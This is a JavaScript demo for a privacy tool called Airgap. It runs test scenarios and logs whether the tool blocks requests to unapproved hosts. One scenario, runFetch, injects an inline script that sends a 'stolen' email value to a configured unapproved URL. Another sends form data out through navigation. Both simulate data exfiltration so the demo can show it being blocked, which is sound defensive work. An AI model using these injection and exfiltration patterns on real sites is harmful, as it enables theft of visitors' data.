/**
 * Airgap security demo scenarios and result log.
 *
 * Result rules:
 * - Pixel: allowed on load. Blocked on error or timeout.
 * - fetch: allowed if it resolves. Error if it rejects. Blocked if it times
 *   out or the host is in airgap.export().requests. Airgap never answers a
 *   blocked fetch, so a timeout means blocked.
 * - Navigation: runs in an iframe so the visitor stays on the page. Allowed if
 *   the frame reaches the target. Blocked if it does not within the timeout.
 * - A securitypolicyviolation event for the host is "blocked by CSP".
 * - report-only mode: a success listed in export().sentRequests is "reported".
 */
(function () {
  const config = window.AIRGAP_DEMO_CONFIG;
  const load = window.AIRGAP_DEMO_LOAD || { status: 'off' };
  const mode = document.body.getAttribute('data-mode');
  const LOG_KEY = `airgap-demo-log:${mode}`;
  const LABELS = {
    allowed: 'Allowed',
    reported: 'Reported',
    blocked: 'Blocked',
    'blocked-by-csp': 'Blocked by CSP',
    error: 'Error',
  };
  const violations = [];
  let running = false;

  document.addEventListener('securitypolicyviolation', (event) => {
    violations.push(event.blockedURI);
  });

  /**
   * @param selector
   */
  function $(selector) {
    return document.querySelector(selector);
  }

  /**
   * @param ms
   */
  function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }

  /**
   * @param url
   */
  function hostOf(url) {
    try {
      return new URL(url, location.href).host;
    } catch (error) {
      return String(url);
    }
  }

  /**
   *
   */
  function readExport() {
    const { airgap } = window;
    if (!airgap || typeof airgap.export !== 'function') return null;
    try {
      return airgap.export();
    } catch (error) {
      return null;
    }
  }

  /**
   * @param items
   * @param host
   */
  function hasHost(items, host) {
    return (items || []).some((item) => hostOf(item && item.url) === host);
  }

  /**
   *
   */
  function timeout() {
    return sleep(config.STALL_TIMEOUT_MS).then(() => 'timeout');
  }

  // ---- Result log ----------------------------------------------------------

  /**
   *
   */
  function readLog() {
    try {
      return JSON.parse(sessionStorage.getItem(LOG_KEY) || '[]');
    } catch (error) {
      return [];
    }
  }

  /**
   * @param row
   */
  function renderRow(row) {
    const tr = document.createElement('tr');
    tr.setAttribute('data-scenario', row.scenario);
    tr.setAttribute('data-outcome', row.outcome);
    [row.at, row.title, row.host, LABELS[row.outcome], row.detail].forEach(
      (text, index) => {
        const td = document.createElement('td');
        if (index === 3) {
          const pill = document.createElement('span');
          pill.className = `pill pill-${row.outcome}`;
          pill.textContent = text;
          td.appendChild(pill);
        } else {
          td.textContent = text;
        }
        tr.appendChild(td);
      },
    );
    $('#log-body').appendChild(tr);
    $('#log-empty').hidden = true;
  }

  /**
   * @param scenario
   * @param outcome
   * @param detail
   */
  function addRow(scenario, outcome, detail) {
    const row = {
      at: new Date().toLocaleTimeString(),
      scenario: scenario.id,
      title: scenario.title,
      host: scenario.host,
      outcome,
      detail,
    };
    const rows = readLog();
    rows.push(row);
    try {
      sessionStorage.setItem(LOG_KEY, JSON.stringify(rows));
    } catch (error) {
      // Storage can be unavailable. The log still shows for this page view.
    }
    renderRow(row);
  }

  /**
   *
   */
  function clearLog() {
    try {
      sessionStorage.removeItem(LOG_KEY);
    } catch (error) {
      // Nothing to clear.
    }
    $('#log-body').textContent = '';
    $('#log-empty').hidden = false;
  }

  // ---- Classification ------------------------------------------------------

  /**
   * Turn a transport result into an outcome and a plain-language detail.
   *
   * @param scenario
   * @param transport
   * @param url
   */
  async function classify(scenario, transport, url) {
    const host = hostOf(url);
    const csp = violations.some((blocked) => hostOf(blocked) === host);
    if (csp) {
      return [
        'blocked-by-csp',
        'The generated Content Security Policy refused the request.',
      ];
    }
    const held = hasHost((readExport() || {}).requests, host);
    if (transport === 'timeout' || held) {
      return [
        'blocked',
        held
          ? 'Airgap held the request. It is listed in airgap.export().requests.'
          : `No answer in ${
              config.STALL_TIMEOUT_MS / 1000
            } seconds. Airgap holds blocked requests.`,
      ];
    }
    if (transport === 'error') {
      return ['error', 'Network error. This is not an Airgap decision.'];
    }
    if (mode === 'report-only') {
      await sleep(400);
      if (hasHost((readExport() || {}).sentRequests, host)) {
        return [
          'reported',
          'Airgap saw the request and let it through. See the panel below.',
        ];
      }
    }
    return ['allowed', `The request reached ${host}.`];
  }

  // ---- Scenarios -----------------------------------------------------------

  /**
   * @param scenario
   */
  async function runPixel(scenario) {
    const url = `${config.UNAPPROVED_PIXEL_URL}?visitor=demo-1234&page=${mode}`;
    const result = await Promise.race([
      new Promise((resolve) => {
        const image = new Image();
        /**
         *
         */
        image.onload = function () {
          resolve('ok');
        };
        /**
         *
         */
        image.onerror = function () {
          resolve('error');
        };
        image.src = url;
      }),
      timeout(),
    ]);
    // A pixel that errors was refused, either by Airgap or by the CSP.
    if (result === 'error') await sleep(50);
    const outcome = await classify(
      scenario,
      result === 'error' ? 'timeout' : result,
      url,
    );
    return outcome;
  }

  /**
   * @param scenario
   */
  async function runFetch(scenario) {
    const url = `${config.UNAPPROVED_FETCH_URL}?stolen=visitor%40example.com`;
    const result = await Promise.race([
      new Promise((resolve) => {
        window.__airgapDemoFetch = resolve;
        // An inline script added at runtime, like a compromised tag would add.
        const injected = document.createElement('script');
        injected.textContent =
          `fetch(${JSON.stringify(url)})` +
          ".then(function(){__airgapDemoFetch('ok')})" +
          ".catch(function(){__airgapDemoFetch('error')})";
        document.head.appendChild(injected);
        injected.remove();
      }),
      timeout(),
    ]);
    if (result === 'error') await sleep(50);
    return classify(scenario, result, url);
  }

  /**
   * @param scenario
   */
  async function runNavigate(scenario) {
    const form = new URLSearchParams(new FormData($('#demo-form'))).toString();
    const url = `${config.UNAPPROVED_NAV_URL}?${form}`;
    const old = $('#nav-frame');
    const frame = document.createElement('iframe');
    frame.id = 'nav-frame';
    frame.title = 'Navigation test frame';
    old.replaceWith(frame);

    const result = await Promise.race([
      new Promise((resolve) => {
        frame.addEventListener('load', () => {
          try {
            // Same-origin access works while the frame is still about:blank.
            void frame.contentWindow.location.href;
            resolve('stayed');
          } catch (error) {
            // A cross-origin error means the frame reached the target.
            resolve('ok');
          }
        });
        frame.contentWindow.location.href = url;
      }),
      timeout(),
    ]);
    const transport = result === 'ok' ? 'ok' : 'timeout';
    const outcome = await classify(scenario, transport, url);
    if (outcome[0] === 'allowed') {
      outcome[1] = `The frame reached ${hostOf(
        url,
      )} with the form data in the URL.`;
    }
    return outcome;
  }

  /**
   * @param scenario
   */
  async function runApproved(scenario) {
    const url = config.APPROVED_URL;
    const result = await Promise.race([
      fetch(url).then(
        () => 'ok',
        () => 'error',
      ),
      timeout(),
    ]);
    return classify(scenario, result, url);
  }

  const SCENARIOS = [
    {
      id: 'pixel',
      title: '1. Pixel from an unapproved host',
      host: config.UNAPPROVED_HOST,
      run: runPixel,
    },
    {
      id: 'fetch',
      title: '2. fetch from an injected script',
      host: config.UNAPPROVED_HOST,
      run: runFetch,
    },
    {
      id: 'navigate',
      title: '3. Navigation with form data in the URL',
      host: config.UNAPPROVED_HOST,
      run: runNavigate,
    },
    {
      id: 'approved',
      title: '4. Call to an approved host',
      host: config.APPROVED_HOST,
      run: runApproved,
    },
  ];

  /**
   * @param scenario
   */
  async function runScenario(scenario) {
    const outcome = await scenario.run(scenario);
    addRow(scenario, outcome[0], outcome[1]);
  }

  /**
   * @param list
   */
  async function runSelected(list) {
    if (running) return;
    running = true;
    document.querySelectorAll('button').forEach((b) => {
      b.disabled = true;
    });
    try {
      for (let i = 0; i < list.length; i += 1) {
        await runScenario(list[i]);
      }
    } finally {
      running = false;
      document.querySelectorAll('button').forEach((b) => {
        b.disabled = false;
      });
    }
    await refreshPanel();
  }

  // ---- Status, tag, and export panel --------------------------------------

  /**
   *
   */
  function renderStatus() {
    const banner = $('#status');
    const { airgap } = window;
    let kind = 'ok';
    let text = `Airgap${
      airgap && airgap.version ? ` version ${airgap.version}` : ''
    } is loaded and running in ${mode} mode.`;
    if (mode === 'off') {
      kind = 'off';
      text = 'Airgap is not loaded on this page. Nothing is regulated.';
    } else if (load.status === 'missing-bundle-id') {
      kind = 'warning';
      text =
        'Airgap is not loaded. Set BUNDLE_ID in src/config.js to the demo bundle ID.';
    } else if (!readExport()) {
      kind = 'error';
      text =
        'Airgap did not load. Check the consent manager domains and that transcend-cdn.com is reachable.';
    }
    banner.className = `status status-${kind}`;
    banner.setAttribute('data-status', kind);
    banner.textContent = text;
  }

  /**
   *
   */
  function renderTag() {
    let { tag } = load;
    if (!tag && mode !== 'off') {
      tag =
        `<script src="${
          config.CDN_ORIGIN
        }/cm/REPLACE_WITH_DEMO_BUNDLE_ID/airgap.js"${(load.attributes || [])
          .map((a) => ` ${a.name}="${a.value}"`)
          .join('')}></` + 'script>';
    }
    $('#script-tag').textContent = tag || 'No airgap.js tag on this page.';
  }

  /**
   * @param selector
   * @param items
   * @param emptyText
   */
  function renderList(selector, items, emptyText) {
    const list = $(selector);
    list.textContent = '';
    const entries = items && items.length ? items : [null];
    entries.forEach((item) => {
      const li = document.createElement('li');
      if (item) {
        const code = document.createElement('code');
        code.textContent = String(item.url);
        li.appendChild(code);
        li.appendChild(document.createTextNode(` ${item.type || ''}`));
      } else {
        li.className = 'muted';
        li.textContent = emptyText;
      }
      list.appendChild(li);
    });
  }

  /**
   *
   */
  async function refreshPanel() {
    await sleep(150);
    const exported = readExport();
    const none = exported ? 'Nothing yet.' : 'Airgap is not loaded.';
    renderList('#sent-requests', exported && exported.sentRequests, none);
    renderList('#held-requests', exported && exported.requests, none);
  }

  // ---- Start ---------------------------------------------------------------

  renderStatus();
  renderTag();
  readLog().forEach(renderRow);
  $('#log-empty').hidden = readLog().length > 0;
  refreshPanel();

  document.querySelectorAll('button[data-scenario]').forEach((button) => {
    button.addEventListener('click', () => {
      const id = button.getAttribute('data-scenario');
      runSelected(SCENARIOS.filter((s) => s.id === id));
    });
  });
  $('#run-all').addEventListener('click', () => {
    runSelected(SCENARIOS);
  });
  $('#clear-log').addEventListener('click', clearLog);
  $('#refresh-panel').addEventListener('click', refreshPanel);
})();
